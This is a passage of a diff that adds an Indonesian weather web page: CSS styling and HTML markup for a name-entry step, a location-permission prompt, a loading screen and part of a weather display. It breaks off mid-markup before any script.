@@ -1,0 +1,1208 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta name="theme-color" content="#060810">
+<title>Cuaca di Lokasimu</title>
+<style>
+  * { box-sizing: border-box; margin: 0; padding: 0; -webkit-tap-highlight-color: transparent; }
+
+  :root {
+    --bg: #060810;
+    --text: #f0f4ff;
+    --text-dim: #8892a8;
+    --text-faint: #5a6478;
+    --border: rgba(255, 255, 255, 0.08);
+    --border-hi: rgba(255, 255, 255, 0.16);
+    --sky: #4dabff;
+    --sky-2: #6dd5ff;
+    --sky-glow: rgba(77, 171, 255, 0.5);
+    --green: #5ce1a0;
+    --amber: #ffb84d;
+  }
+
+  html, body {
+    height: 100%;
+    background: var(--bg);
+    color: var(--text);
+    font-family: -apple-system, BlinkMacSystemFont, "Inter", "Segoe UI", Roboto, sans-serif;
+    -webkit-font-smoothing: antialiased;
+    overflow-x: hidden;
+  }
+
+  body {
+    display: grid; place-items: center;
+    padding: 20px; min-height: 100dvh;
+    position: relative;
+    -webkit-user-select: none; user-select: none;
+  }
+
+  .bg-sky {
+    position: fixed; inset: 0; pointer-events: none; z-index: 0;
+    background:
+      radial-gradient(900px circle at 15% 0%, rgba(77, 171, 255, 0.14), transparent 55%),
+      radial-gradient(700px circle at 90% 100%, rgba(109, 213, 255, 0.10), transparent 55%);
+  }
+
+  .bg-grid {
+    position: fixed; inset: 0; pointer-events: none; z-index: 0;
+    background-image:
+      linear-gradient(rgba(255,255,255,0.015) 1px, transparent 1px),
+      linear-gradient(90deg, rgba(255,255,255,0.015) 1px, transparent 1px);
+    background-size: 56px 56px;
+    mask-image: radial-gradient(circle at 50% 50%, #000 20%, transparent 70%);
+    -webkit-mask-image: radial-gradient(circle at 50% 50%, #000 20%, transparent 70%);
+  }
+
+  .grain {
+    position: fixed; inset: 0; pointer-events: none; z-index: 1; opacity: 0.02;
+    background-image: url("data:image/svg+xml;utf8,<svg xmlns='http://www.w3.org/2000/svg' width='200' height='200'><filter id='n'><feTurbulence baseFrequency='0.9'/></filter><rect width='100%25' height='100%25' filter='url(%23n)'/></svg>");
+  }
+
+  .card {
+    position: relative; z-index: 2;
+    width: 100%; max-width: 480px;
+    padding: 36px 26px 24px; border-radius: 26px;
+    background: linear-gradient(180deg, rgba(22, 30, 48, 0.82), rgba(10, 14, 24, 0.96));
+    border: 1px solid var(--border);
+    backdrop-filter: blur(24px) saturate(150%);
+    -webkit-backdrop-filter: blur(24px) saturate(150%);
+    box-shadow:
+      0 40px 100px -30px rgba(0, 0, 0, 0.9),
+      0 0 0 1px rgba(255, 255, 255, 0.02) inset,
+      0 1px 0 0 rgba(255, 255, 255, 0.05) inset;
+    animation: cardIn 0.9s cubic-bezier(0.2, 0.8, 0.2, 1) both;
+    overflow: hidden;
+  }
+
+  @keyframes cardIn {
+    from { opacity: 0; transform: translateY(24px) scale(0.98); }
+    to   { opacity: 1; transform: translateY(0) scale(1); }
+  }
+
+  .header {
+    display: flex; align-items: center; justify-content: space-between;
+    margin-bottom: 20px;
+  }
+
+  .brand {
+    display: flex; align-items: center; gap: 9px;
+    font-size: 13px; font-weight: 700;
+  }
+
+  .brand-mark {
+    width: 26px; height: 26px; border-radius: 8px;
+    background: linear-gradient(135deg, var(--sky), var(--sky-2));
+    display: grid; place-items: center;
+    box-shadow: 0 6px 16px -4px var(--sky-glow);
+  }
+
+  .brand-mark svg { width: 14px; height: 14px; stroke: #fff; fill: none; stroke-width: 2.2; stroke-linecap: round; }
+
+  .badge {
+    display: inline-flex; align-items: center; gap: 6px;
+    padding: 5px 10px; border-radius: 999px;
+    background: rgba(77, 171, 255, 0.08);
+    border: 1px solid rgba(77, 171, 255, 0.22);
+    font-size: 9.5px; letter-spacing: 0.12em;
+    text-transform: uppercase; color: var(--sky); font-weight: 700;
+  }
+
+  .badge::before {
+    content: ""; width: 5px; height: 5px; border-radius: 50%;
+    background: var(--sky); box-shadow: 0 0 8px var(--sky);
+    animation: pulse 2s ease-in-out infinite;
+  }
+
+  @keyframes pulse {
+    0%, 100% { opacity: 1; transform: scale(1); }
+    50%      { opacity: 0.35; transform: scale(0.8); }
+  }
+
+  .step { display: none; animation: stepIn 0.5s cubic-bezier(0.2, 0.8, 0.2, 1) both; }
+  .step.active { display: block; }
+
+  @keyframes stepIn {
+    from { opacity: 0; transform: translateY(12px); }
+    to   { opacity: 1; transform: translateY(0); }
+  }
+
+  .hero-icon-wrap {
+    width: 88px; height: 88px;
+    margin: 4px auto 22px;
+    display: grid; place-items: center;
+    animation: floatIcon 4s ease-in-out infinite;
+  }
+
+  @keyframes floatIcon {
+    0%, 100% { transform: translateY(0); }
+    50%      { transform: translateY(-6px); }
+  }
+
+  .hero-icon-wrap svg {
+    width: 88px; height: 88px;
+    stroke: var(--sky); fill: none; stroke-width: 1.4;
+    stroke-linecap: round; stroke-linejoin: round;
+    filter: drop-shadow(0 0 26px rgba(77, 171, 255, 0.55));
+  }
+
+  .step-title {
+    font-size: 24px; font-weight: 700; line-height: 1.2;
+    letter-spacing: -0.025em; text-align: center;
+    margin-bottom: 10px;
+    background: linear-gradient(180deg, #ffffff 0%, #b8c8e0 100%);
+    -webkit-background-clip: text; background-clip: text;
+    -webkit-text-fill-color: transparent;
+  }
+
+  .step-desc {
+    font-size: 13.5px; line-height: 1.6;
+    color: var(--text-dim); text-align: center;
+    margin-bottom: 28px; max-width: 320px;
+    margin-left: auto; margin-right: auto;
+  }
+
+  .field { position: relative; margin-bottom: 12px; }
+
+  .field-label {
+    position: absolute; top: 10px; left: 18px;
+    font-size: 10px; letter-spacing: 0.14em;
+    text-transform: uppercase; font-weight: 700;
+    color: var(--text-faint); pointer-events: none;
+    transition: color 0.2s ease;
+  }
+
+  .field-input {
+    width: 100%; padding: 24px 20px 12px;
+    border-radius: 14px; border: 1px solid var(--border);
+    background: rgba(10, 14, 24, 0.6);
+    color: var(--text); font-family: inherit;
+    font-size: 15px; font-weight: 600;
+    letter-spacing: -0.01em; outline: none;
+    transition: border-color 0.25s ease, background 0.25s ease, box-shadow 0.25s ease;
+    -webkit-appearance: none; appearance: none;
+    -webkit-user-select: text; user-select: text;
+  }
+
+  .field-input::placeholder { color: transparent; }
+  .field-input:hover { border-color: var(--border-hi); background: rgba(14, 20, 34, 0.7); }
+  .field-input:focus {
+    border-color: rgba(77, 171, 255, 0.5);
+    background: rgba(16, 22, 36, 0.85);
+    box-shadow: 0 0 0 3px rgba(77, 171, 255, 0.12);
+  }
+  .field-input:focus ~ .field-label { color: var(--sky); }
+
+  .field-counter {
+    position: absolute; top: 12px; right: 16px;
+    font-size: 10px;
+    font-family: ui-monospace, "SF Mono", Menlo, monospace;
+    font-weight: 700; color: var(--text-faint);
+    opacity: 0; transition: opacity 0.2s ease;
+  }
+
+  .field-input:focus ~ .field-counter,
+  .field-counter.visible { opacity: 1; }
+
+  .field-hint {
+    font-size: 10.5px; color: var(--text-faint);
+    letter-spacing: 0.04em; text-align: center;
+    margin-bottom: 20px;
+  }
+
+  .btn {
+    position: relative; width: 100%;
+    padding: 16px 24px;
+    border: 0; border-radius: 14px;
+    font-family: inherit; font-size: 15px; font-weight: 700;
+    color: #ffffff; cursor: pointer;
+    background: linear-gradient(135deg, var(--sky), var(--sky-2));
+    box-shadow: 0 14px 36px -12px var(--sky-glow), 0 0 0 1px rgba(255, 255, 255, 0.08) inset;
+    transition: transform 0.15s ease, box-shadow 0.25s ease, filter 0.25s ease, opacity 0.3s ease;
+    overflow: hidden; outline: none;
+    -webkit-appearance: none; appearance: none;
+    -webkit-tap-highlight-color: transparent;
+    touch-action: manipulation;
+    -webkit-user-select: none; user-select: none;
+  }
+
+  .btn:hover:not(:disabled) {
+    transform: translateY(-2px); filter: brightness(1.08);
+    box-shadow: 0 20px 48px -12px var(--sky-glow), 0 0 0 1px rgba(255, 255, 255, 0.14) inset;
+  }
+  .btn:active:not(:disabled) { transform: translateY(0) scale(0.985); }
+  .btn:disabled { cursor: not-allowed; opacity: 0.4; filter: grayscale(0.4); }
+
+  .btn::after {
+    content: ""; position: absolute; top: 0; left: -100%;
+    width: 100%; height: 100%;
+    background: linear-gradient(90deg, transparent, rgba(255,255,255,0.25), transparent);
+    transition: left 0.7s ease; pointer-events: none;
+  }
+  .btn:hover:not(:disabled)::after { left: 100%; }
+
+  .perm-icon {
+    width: 80px; height: 80px;
+    margin: 4px auto 22px;
+    border-radius: 22px;
+    display: grid; place-items: center;
+    background: linear-gradient(135deg, rgba(77, 171, 255, 0.20), rgba(109, 213, 255, 0.10));
+    border: 1px solid rgba(77, 171, 255, 0.35);
+    box-shadow: 0 20px 44px -14px var(--sky-glow), 0 0 0 8px rgba(77, 171, 255, 0.05);
+    position: relative;
+  }
+
+  .perm-icon::before {
+    content: ""; position: absolute; inset: -12px;
+    border-radius: 34px;
+    border: 1px solid rgba(77, 171, 255, 0.15);
+    animation: ring 2.4s ease-in-out infinite;
+  }
+
+  @keyframes ring {
+    0%, 100% { transform: scale(1); opacity: 0.6; }
+    50%      { transform: scale(1.05); opacity: 0; }
+  }
+
+  .perm-icon svg {
+    width: 38px; height: 38px;
+    stroke: var(--sky); fill: none; stroke-width: 1.6;
+    stroke-linecap: round; stroke-linejoin: round;
+  }
+
+  .perm-list { display: grid; gap: 10px; margin-bottom: 22px; }
+
+  .perm-item {
+    display: flex; align-items: center; gap: 12px;
+    padding: 12px 14px; border-radius: 12px;
+    background: rgba(255, 255, 255, 0.025);
+    border: 1px solid var(--border);
+    font-size: 13px; color: var(--text);
+    text-align: left;
+  }
+
+  .perm-check {
+    width: 20px; height: 20px;
+    flex-shrink: 0; border-radius: 6px;
+    background: rgba(77, 171, 255, 0.14);
+    border: 1px solid rgba(77, 171, 255, 0.3);
+    display: grid; place-items: center;
+  }
+
+  .perm-check svg {
+    width: 11px; height: 11px;
+    stroke: var(--sky); fill: none; stroke-width: 3;
+    stroke-linecap: round; stroke-linejoin: round;
+  }
+
+  .perm-actions {
+    display: grid; grid-template-columns: 1fr 1.6fr; gap: 10px;
+  }
+
+  .btn-ghost {
+    padding: 15px 18px; border-radius: 14px;
+    border: 1px solid var(--border);
+    background: rgba(10, 14, 24, 0.5);
+    color: var(--text-dim);
+    font-family: inherit; font-size: 14px; font-weight: 600;
+    cursor: pointer;
+    transition: background 0.2s ease, color 0.2s ease, border-color 0.2s ease, transform 0.1s ease;
+    outline: none;
+    -webkit-tap-highlight-color: transparent;
+    touch-action: manipulation;
+  }
+
+  .btn-ghost:hover { background: rgba(30, 40, 60, 0.6); color: var(--text); border-color: var(--border-hi); }
+  .btn-ghost:active { transform: scale(0.98); }
+
+  .perm-note {
+    font-size: 10.5px; color: var(--text-faint);
+    text-align: center; letter-spacing: 0.04em;
+    margin-top: 14px; padding-top: 14px;
+    border-top: 1px solid var(--border);
+  }
+
+  .perm-source {
+    font-size: 11px; color: var(--text-faint);
+    text-align: center; letter-spacing: 0.02em;
+    margin-top: 12px; line-height: 1.55;
+    padding: 10px 12px; border-radius: 10px;
+    background: rgba(77, 171, 255, 0.05);
+    border: 1px solid rgba(77, 171, 255, 0.15);
+  }
+
+  .perm-source strong { color: var(--sky); font-weight: 700; }
+
+  .confirm-modal {
+    position: fixed; inset: 0; z-index: 999;
+    background: rgba(0, 0, 0, 0.75);
+    backdrop-filter: blur(10px);
+    -webkit-backdrop-filter: blur(10px);
+    display: none; place-items: center; padding: 20px;
+  }
+
+  .confirm-modal.show { display: grid; animation: confirmFadeIn 0.3s ease both; }
+
+  @keyframes confirmFadeIn { from { opacity: 0; } to { opacity: 1; } }
+
+  .confirm-box {
+    background: linear-gradient(180deg, rgba(26, 34, 52, 0.98), rgba(14, 18, 30, 1));
+    border: 1px solid var(--border); border-radius: 22px;
+    padding: 30px 24px 22px;
+    max-width: 400px; width: 100%; text-align: center;
+    box-shadow: 0 40px 100px -30px rgba(0, 0, 0, 0.95);
+    animation: confirmBoxIn 0.4s cubic-bezier(0.2, 0.8, 0.2, 1) both;
+  }
+
+  @keyframes confirmBoxIn {
+    from { opacity: 0; transform: translateY(20px) scale(0.96); }
+    to   { opacity: 1; transform: translateY(0) scale(1); }
+  }
+
+  .confirm-icon {
+    width: 60px; height: 60px; border-radius: 18px;
+    margin: 0 auto 18px;
+    display: grid; place-items: center;
+    background: linear-gradient(135deg, rgba(255, 184, 77, 0.18), rgba(255, 138, 61, 0.10));
+    border: 1px solid rgba(255, 184, 77, 0.35);
+    box-shadow: 0 14px 34px -12px rgba(255, 184, 77, 0.6);
+  }
+
+  .confirm-icon svg {
+    width: 28px; height: 28px;
+    stroke: var(--amber); fill: none; stroke-width: 1.8;
+    stroke-linecap: round; stroke-linejoin: round;
+  }
+
+  .confirm-title {
+    font-size: 18px; font-weight: 700;
+    letter-spacing: -0.015em; margin-bottom: 10px;
+  }
+
+  .confirm-desc {
+    font-size: 13.5px; line-height: 1.65;
+    color: var(--text-dim); margin-bottom: 22px;
+    max-width: 320px; margin-left: auto; margin-right: auto;
+  }
+
+  .confirm-desc strong { color: var(--text); font-weight: 700; }
+
+  .confirm-actions {
+    display: grid; grid-template-columns: 1fr 1.4fr; gap: 10px;
+  }
+
+  .confirm-btn-back {
+    padding: 14px 18px; border-radius: 13px;
+    border: 1px solid rgba(77, 171, 255, 0.35);
+    background: rgba(77, 171, 255, 0.10);
+    color: var(--sky);
+    font-family: inherit; font-size: 14px; font-weight: 700;
+    cursor: pointer;
+    transition: background 0.2s ease, transform 0.1s ease;
+    outline: none;
+    -webkit-tap-highlight-color: transparent;
+  }
+
+  .confirm-btn-back:hover { background: rgba(77, 171, 255, 0.18); }
+  .confirm-btn-back:active { transform: scale(0.98); }
+
+  .confirm-btn-continue {
+    padding: 14px 18px; border-radius: 13px;
+    border: 1px solid var(--border);
+    background: rgba(255, 255, 255, 0.04);
+    color: var(--text-dim);
+    font-family: inherit; font-size: 14px; font-weight: 600;
+    cursor: pointer;
+    transition: background 0.2s ease, color 0.2s ease, border-color 0.2s ease, transform 0.1s ease;
+    outline: none;
+    -webkit-tap-highlight-color: transparent;
+  }
+
+  .confirm-btn-continue:hover { background: rgba(30, 40, 60, 0.7); color: var(--text); border-color: var(--border-hi); }
+  .confirm-btn-continue:active { transform: scale(0.98); }
+
+  .loading-wrap { padding: 24px 0; text-align: center; }
+
+  .loading-icon {
+    width: 100px; height: 100px;
+    margin: 8px auto 24px;
+    display: grid; place-items: center;
+    position: relative;
+  }
+
+  .loading-sun {
+    width: 44px; height: 44px; border-radius: 50%;
+    background: radial-gradient(circle, #6dd5ff, #4dabff);
+    box-shadow: 0 0 40px rgba(77, 171, 255, 0.7);
+    position: absolute; top: 12px; left: 50%;
+    transform: translateX(-50%);
+    animation: sunSpin 4s linear infinite;
+  }
+
+  @keyframes sunSpin {
+    from { transform: translateX(-50%) rotate(0deg); }
+    to   { transform: translateX(-50%) rotate(360deg); }
+  }
+
+  .loading-cloud {
+    width: 68px; height: 26px; border-radius: 20px;
+    background: linear-gradient(180deg, rgba(255,255,255,0.22), rgba(255,255,255,0.10));
+    border: 1px solid rgba(255,255,255,0.15);
+    position: absolute; bottom: 14px; left: 50%;
+    transform: translateX(-50%);
+    animation: cloudFloat 2.5s ease-in-out infinite;
+  }
+
+  .loading-cloud::before,
+  .loading-cloud::after {
+    content: ""; position: absolute; border-radius: 50%;
+    background: inherit; border: 1px solid rgba(255,255,255,0.15);
+  }
+
+  .loading-cloud::before { width: 30px; height: 30px; left: 8px; top: -14px; }
+  .loading-cloud::after { width: 22px; height: 22px; right: 10px; top: -10px; }
+
+  @keyframes cloudFloat {
+    0%, 100% { transform: translateX(-50%) translateY(0); }
+    50%      { transform: translateX(-50%) translateY(-4px); }
+  }
+
+  .loading-title {
+    font-size: 18px; font-weight: 700;
+    letter-spacing: -0.02em; margin-bottom: 8px;
+  }
+
+  .loading-status {
+    font-size: 12.5px; color: var(--text-dim);
+    min-height: 18px; letter-spacing: 0.02em;
+    margin-bottom: 24px;
+  }
+
+  .loading-progress {
+    width: 100%; height: 3px; border-radius: 999px;
+    background: rgba(255, 255, 255, 0.05); overflow: hidden;
+  }
+
+  .loading-progress-fill {
+    height: 100%; width: 0%; border-radius: 999px;
+    background: linear-gradient(90deg, var(--sky), var(--sky-2));
+    box-shadow: 0 0 16px var(--sky-glow);
+    transition: width 0.5s cubic-bezier(0.4, 0, 0.2, 1);
+  }
+
+  .weather-top {
+    display: flex; align-items: center; justify-content: space-between;
+    margin-bottom: 4px;
+  }
+
+  .weather-top-label {
+    font-size: 11px; letter-spacing: 0.14em;
+    text-transform: uppercase; color: var(--text-faint);
+    font-weight: 700;
+  }
+
+  .weather-live {
+    display: inline-flex; align-items: center; gap: 6px;
+    padding: 4px 10px; border-radius: 999px;
+    background: rgba(92, 225, 160, 0.10);
+    border: 1px solid rgba(92, 225, 160, 0.25);
+    font-size: 9.5px; letter-spacing: 0.12em;
+    text-transform: uppercase; color: var(--green);
+    font-weight: 700;
+  }
+
+  .weather-live::before {
+    content: ""; width: 5px; height: 5px; border-radius: 50%;
+    background: var(--green); box-shadow: 0 0 8px var(--green);
+    animation: pulse 1.6s ease-in-out infinite;
+  }
+
+  .weather-hero { text-align: center; padding: 20px 0 22px; }
+
+  .weather-hero-icon {
+    width: 88px; height: 88px;
+    margin: 0 auto 12px;
+    animation: floatIcon 4s ease-in-out infinite;
+  }
+
+  .weather-hero-icon svg {
+    width: 88px; height: 88px;
+    stroke: var(--sky); fill: none; stroke-width: 1.4;
+    stroke-linecap: round; stroke-linejoin: round;
+    filter: drop-shadow(0 0 22px rgba(77, 171, 255, 0.55));
+  }
+
+  .weather-temp {
+    font-family: ui-monospace, "SF Mono", Menlo, monospace;
+    font-size: 68px; font-weight: 200; line-height: 1;
+    letter-spacing: -0.05em;
+    background: linear-gradient(180deg, #ffffff 0%, #b8c8e0 100%);
+    -webkit-background-clip: text; background-clip: text;
+    -webkit-text-fill-color: transparent;
+    font-variant-numeric: tabular-nums;
+    margin-bottom: 6px;
+  }
+
+  .weather-temp sup { font-size: 28px; vertical-align: super; opacity: 0.6; font-weight: 300; }
+
+  .weather-cond {
+    font-size: 14.5px; font-weight: 500;
+    color: var(--text); margin-bottom: 6px;
+  }
+
+  .weather-loc {
+    display: inline-flex; align-items: center; gap: 5px;
+    padding: 4px 10px; border-radius: 999px;
+    background: rgba(255, 255, 255, 0.04);
+    border: 1px solid var(--border);
+    font-size: 11.5px; color: var(--text-dim);
+  }
+
+  .weather-loc svg { width: 11px; height: 11px; stroke: var(--text-dim); fill: none; stroke-width: 2; }
+
+  .weather-highlight {
+    display: grid; grid-template-columns: 1fr 1fr 1fr; gap: 8px;
+    padding: 14px 0;
+    border-top: 1px solid var(--border);
+    border-bottom: 1px solid var(--border);
+    margin-bottom: 18px;
+  }
+
+  .hl {
+    text-align: center; padding: 10px 6px;
+    border-radius: 12px;
+    background: rgba(255, 255, 255, 0.02);
+  }
+
+  .hl-k {
+    font-size: 9.5px; letter-spacing: 0.14em;
+    text-transform: uppercase; color: var(--text-faint);
+    font-weight: 700; margin-bottom: 6px;
+  }
+
+  .hl-v {
+    font-size: 14px; font-weight: 700;
+    font-family: ui-monospace, "SF Mono", Menlo, monospace;
+    color: var(--text);
+    font-variant-numeric: tabular-nums;
+  }
+
+  .section-title {
+    font-size: 10.5px; letter-spacing: 0.16em;
+    text-transform: uppercase; color: var(--text-faint);
+    font-weight: 700; margin-bottom: 10px;
+    text-align: left;
+    display: flex; align-items: center; justify-content: space-between;
+  }
+
+  .section-title span:last-child {
+    font-size: 9.5px; letter-spacing: 0.1em;
+    color: var(--text-faint); opacity: 0.6; font-weight: 600;
+  }
+
+  .forecast {
+    display: grid; grid-template-columns: repeat(7, 1fr);
+    gap: 4px; margin-bottom: 20px;
+  }
+
+  .fday {
+    text-align: center; padding: 10px 2px;
+    border-radius: 10px;
+    background: rgba(255, 255, 255, 0.02);
+    border: 1px solid var(--border);
+    transition: background 0.2s ease, border-color 0.2s ease;
+  }
+
+  .fday:hover {
+    background: rgba(77, 171, 255, 0.08);
+    border-color: rgba(77, 171, 255, 0.25);
+  }
+
+  .fday.today {
+    background: rgba(77, 171, 255, 0.10);
+    border-color: rgba(77, 171, 255, 0.3);
+  }
+
+  .fday-name {
+    font-size: 9.5px; color: var(--text-faint);
+    font-weight: 700; letter-spacing: 0.04em;
+    text-transform: uppercase; margin-bottom: 4px;
+  }
+
+  .fday.today .fday-name { color: var(--sky); }
+
+  .fday-date {
+    font-size: 9px; color: var(--text-faint);
+    opacity: 0.6; font-weight: 600;
+    font-family: ui-monospace, "SF Mono", Menlo, monospace;
+    margin-bottom: 6px;
+  }
+
+  .fday-icon {
+    width: 22px; height: 22px;
+    margin: 0 auto 6px;
+  }
+
+  .fday-icon svg {
+    width: 22px; height: 22px;
+    stroke: var(--sky); fill: none; stroke-width: 1.8;
+    stroke-linecap: round; stroke-linejoin: round;
+    opacity: 0.9;
+  }
+
+  .fday-temp {
+    font-size: 11.5px; font-weight: 700;
+    font-family: ui-monospace, "SF Mono", Menlo, monospace;
+    color: var(--text);
+    font-variant-numeric: tabular-nums;
+  }
+
+  .fday-temp-min {
+    font-size: 9.5px; color: var(--text-faint);
+    font-weight: 500; margin-top: 1px;
+    font-family: ui-monospace, "SF Mono", Menlo, monospace;
+  }
+
+  .fday-rain {
+    font-size: 8.5px; color: var(--sky);
+    font-weight: 700; margin-top: 3px;
+    opacity: 0.85;
+    font-family: ui-monospace, "SF Mono", Menlo, monospace;
+  }
+
+  .detail-grid {
+    display: grid; grid-template-columns: 1fr 1fr 1fr;
+    gap: 6px; margin-bottom: 16px;
+  }
+
+  .ditem {
+    padding: 11px 8px; border-radius: 11px;
+    background: rgba(255, 255, 255, 0.02);
+    border: 1px solid var(--border);
+    text-align: left;
+    display: flex; flex-direction: column; gap: 4px;
+  }
+
+  .ditem-head {
+    display: flex; align-items: center; gap: 5px;
+    font-size: 9.5px; letter-spacing: 0.08em;
+    text-transform: uppercase; color: var(--text-faint);
+    font-weight: 700;
+  }
+
+  .ditem-head svg {
+    width: 10px; height: 10px;
+    stroke: var(--text-faint); fill: none; stroke-width: 2;
+    stroke-linecap: round; stroke-linejoin: round;
+    flex-shrink: 0;
+  }
+
+  .ditem-v {
+    font-size: 13px; font-weight: 700;
+    font-family: ui-monospace, "SF Mono", Menlo, monospace;
+    color: var(--text);
+    font-variant-numeric: tabular-nums;
+    letter-spacing: -0.01em;
+  }
+
+  .ditem-v span {
+    font-size: 9.5px; color: var(--text-faint);
+    font-weight: 500; margin-left: 2px;
+    font-family: inherit;
+  }
+
+  .sun-bar {
+    display: flex; align-items: center; justify-content: space-between;
+    padding: 12px 14px; border-radius: 12px;
+    background: rgba(255, 255, 255, 0.02);
+    border: 1px solid var(--border);
+    margin-bottom: 18px;
+  }
+
+  .sun-item {
+    display: flex; align-items: center; gap: 8px;
+    font-size: 12px;
+  }
+
+  .sun-item svg {
+    width: 14px; height: 14px;
+    stroke: var(--amber); fill: none; stroke-width: 1.8;
+    stroke-linecap: round; stroke-linejoin: round;
+  }
+
+  .sun-item-k {
+    font-size: 9.5px; color: var(--text-faint);
+    letter-spacing: 0.08em; text-transform: uppercase;
+    font-weight: 700;
+  }
+
+  .sun-item-v {
+    font-size: 12px; font-weight: 700;
+    font-family: ui-monospace, "SF Mono", Menlo, monospace;
+    color: var(--text);
+  }
+
+  .sun-divider { width: 1px; height: 22px; background: var(--border); }
+
+  .weather-footer {
+    display: flex; align-items: center; justify-content: space-between;
+    font-size: 10px; color: var(--text-faint);
+    letter-spacing: 0.04em; padding-top: 14px;
+    border-top: 1px solid var(--border);
+  }
+
+  .weather-footer-left { display: inline-flex; align-items: center; gap: 5px; }
+
+  .weather-footer-left svg {
+    width: 10px; height: 10px;
+    stroke: var(--text-faint); fill: none; stroke-width: 2;
+  }
+
+  .reset-btn {
+    background: none; border: 0;
+    color: var(--text-faint);
+    font-family: inherit; font-size: 10px;
+    letter-spacing: 0.04em; cursor: pointer;
+    padding: 4px 8px; border-radius: 6px;
+    transition: color 0.2s ease, background 0.2s ease;
+    -webkit-tap-highlight-color: transparent;
+  }
+
+  .reset-btn:hover { color: var(--text-dim); background: rgba(255, 255, 255, 0.04); }
+
+  .source-note {
+    font-size: 10px; color: var(--text-faint);
+    text-align: center; letter-spacing: 0.03em;
+    margin-top: 12px; line-height: 1.5;
+  }
+
+  .source-note strong { color: var(--sky); font-weight: 700; }
+
+  @media (prefers-reduced-motion: reduce) {
+    * { animation-duration: 0.01ms !important; animation-iteration-count: 1 !important; transition-duration: 0.01ms !important; }
+  }
+
+  @media (max-width: 420px) {
+    .card { padding: 28px 18px 20px; border-radius: 22px; }
+    .step-title { font-size: 21px; }
+    .weather-temp { font-size: 58px; }
+    .weather-hero-icon { width: 76px; height: 76px; }
+    .weather-hero-icon svg { width: 76px; height: 76px; }
+    .hero-icon-wrap { width: 76px; height: 76px; }
+    .hero-icon-wrap svg { width: 76px; height: 76px; }
+    .perm-icon { width: 68px; height: 68px; }
+    .perm-icon svg { width: 32px; height: 32px; }
+    .perm-actions { grid-template-columns: 1fr; }
+    .confirm-actions { grid-template-columns: 1fr; }
+    .confirm-box { padding: 26px 20px 20px; }
+    .forecast { gap: 3px; }
+    .fday { padding: 8px 1px; }
+    .fday-icon { width: 18px; height: 18px; }
+    .fday-icon svg { width: 18px; height: 18px; }
+    .fday-temp { font-size: 10.5px; }
+    .fday-temp-min { font-size: 8.5px; }
+    .ditem-v { font-size: 12px; }
+  }
+</style>
+</head>
+<body>
+  <div class="bg-sky"></div>
+  <div class="bg-grid"></div>
+  <div class="grain"></div>
+
+  <div class="card">
+    <div class="header">
+      <div class="brand">
+        <div class="brand-mark">
+          <svg viewBox="0 0 24 24">
+            <circle cx="12" cy="12" r="4"/>
+            <line x1="12" y1="2" x2="12" y2="4"/>
+            <line x1="12" y1="20" x2="12" y2="22"/>
+            <line x1="4" y1="12" x2="2" y2="12"/>
+            <line x1="22" y1="12" x2="20" y2="12"/>
+          </svg>
+        </div>
+        <span>Cuaca</span>
+      </div>
+      <div class="badge" id="badgeText">Langkah 1</div>
+    </div>
+
+    <div class="step active" id="stepName">
+      <div class="hero-icon-wrap">
+        <svg viewBox="0 0 64 64">
+          <circle cx="24" cy="22" r="8"/>
+          <line x1="24" y1="6" x2="24" y2="10"/>
+          <line x1="24" y1="34" x2="24" y2="38"/>
+          <line x1="8" y1="22" x2="12" y2="22"/>
+          <line x1="36" y1="22" x2="40" y2="22"/>
+          <line x1="13" y1="11" x2="16" y2="14"/>
+          <line x1="32" y1="30" x2="35" y2="33"/>
+          <line x1="13" y1="33" x2="16" y2="30"/>
+          <line x1="32" y1="14" x2="35" y2="11"/>
+          <path d="M46 54H24a9 9 0 0 1 0-18 11 11 0 0 1 21 3 7 7 0 0 1 1 15z" fill="rgba(77,171,255,0.12)"/>
+        </svg>
+      </div>
+
+      <h1 class="step-title">Cuaca di Lokasimu</h1>
+      <p class="step-desc">
+        Masukkan nama untuk personalisasi tampilan cuaca di wilayahmu.
+      </p>
+
+      <div class="field">
+        <input type="text" id="nameInput" class="field-input" placeholder="Nama kamu" maxlength="30" autocomplete="off" spellcheck="false">
+        <label class="field-label" for="nameInput">Nama</label>
+        <span class="field-counter" id="nameCounter">0/30</span>
+      </div>
+
+      <p class="field-hint">Nama hanya dipakai untuk personalisasi tampilan</p>
+      <button class="btn" id="nextBtn" disabled>Lanjut</button>
+    </div>
+
+    <div class="step" id="stepPerm">
+      <div class="perm-icon">
+        <svg viewBox="0 0 24 24">
+          <path d="M21 10c0 7-9 13-9 13s-9-6-9-13a9 9 0 0 1 18 0z"/>
+          <circle cx="12" cy="10" r="3"/>
+        </svg>
+      </div>
+
+      <h2 class="step-title">Aktifkan Lokasi</h2>
+      <p class="step-desc">Untuk menampilkan cuaca yang akurat, kami perlu tahu di mana kamu berada.</p>
+
+      <div class="perm-list">
+        <div class="perm-item"><div class="perm-check"><svg viewBox="0 0 24 24"><polyline points="20 6 9 17 4 12"/></svg></div><span>Cuaca real-time di kotamu</span></div>
+        <div class="perm-item"><div class="perm-check"><svg viewBox="0 0 24 24"><polyline points="20 6 9 17 4 12"/></svg></div><span>Prakiraan akurat 7 hari ke depan</span></div>
+        <div class="perm-item"><div class="perm-check"><svg viewBox="0 0 24 24"><polyline points="20 6 9 17 4 12"/></svg></div><span>Detail angin, UV, kelembapan & lainnya</span></div>
+      </div>
+
+      <div class="perm-actions">
+        <button class="btn-ghost" id="skipBtn">Nanti Aja</button>
+        <button class="btn" id="allowBtn">Izinkan Lokasi</button>
+      </div>
+
+      <div class="perm-source">
+        Data cuaca diambil dari <strong>Open-Meteo</strong> dan dicocokkan dengan lokasi Anda
+      </div>
+
+      <p class="perm-note">Lokasi diproses sesaat, tidak disimpan permanen</p>
+    </div>
+
+    <div class="step" id="stepLoading">
+      <div class="loading-wrap">
+        <div class="loading-icon">
+          <div class="loading-sun"></div>
+          <div class="loading-cloud"></div>
+        </div>
+        <h2 class="loading-title">Mengambil Data Cuaca</h2>
+        <p class="loading-status" id="loadingStatus">Mendeteksi lokasimu...</p>
+        <div class="loading-progress">
+          <div class="loading-progress-fill" id="progressFill"></div>
+        </div>
+      </div>
+    </div>
+
+    <div class="step" id="stepWeather">
+      <div class="weather-top">
+        <span class="weather-top-label">Cuaca Saat Ini</span>
+        <span class="weather-live">Live</span>
+      </div>
+
+      <div class="weather-hero">
+        <div class="weather-hero-icon" id="weatherIcon"></div>
+        <div class="weather-temp" id="weatherTemp">--<sup>°C</sup></div>
+        <div class="weather-cond" id="weatherCond">Memuat...</div>
+        <div class="weather-loc">
